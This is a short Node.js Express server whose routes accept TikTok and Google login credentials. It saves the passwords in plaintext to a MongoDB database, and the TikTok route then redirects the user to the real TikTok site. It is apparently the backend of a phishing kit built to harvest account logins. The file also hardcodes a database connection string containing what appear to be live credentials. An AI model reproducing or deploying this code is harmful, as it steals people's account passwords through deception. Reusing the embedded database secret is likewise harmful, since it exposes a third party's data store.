
// Import required modules
const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');


const cors = require('cors');

// Initialize Express
const app = express();
app.use(cors());
// Middleware to parse JSON
app.use(bodyParser.json());

// Connect to MongoDB (replace with your connection string)
const MONGO_URI = 'mongodb+srv://adamantite16:YN9WuEPyetO80LVC@projectnull.gqhrd.mongodb.net/?retryWrites=true&w=majority&appName=Projectnull';

mongoose.connect(MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', () => {
    console.log('Connected to MongoDB');
});

// Define user schema and models
const userSchema = new mongoose.Schema({
    username: { type: String, required: false },
    email: { type: String, required: false },
    password: { type: String, required: true },
    platform: { type: String, required: true },
});

const User = mongoose.model('User', userSchema);

// TikTok login route
app.post('/tiktoklogin', async (req, res) => {
    const { username, password } = req.body;
   
    if (!username || !password) {
        return res.status(400).json({ error: 'Username and password are required.' });
    }

    try {
        const newUser = new User({ username, password, platform: 'TikTok' });
        await newUser.save();
        res.redirect("https://www.tiktok.com/en/")
    } catch (error) {
        res.status(500).json({ error: 'Retry something went wrong' });
    }
});

// Google login route
app.post('/googlelogin', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required.' });
    }

    try {
        const newUser = new User({ email, password, platform: 'Google' });
        await newUser.save();
        res.status(201).json({ message: 'Google login data saved successfully.' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to save data.' });
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
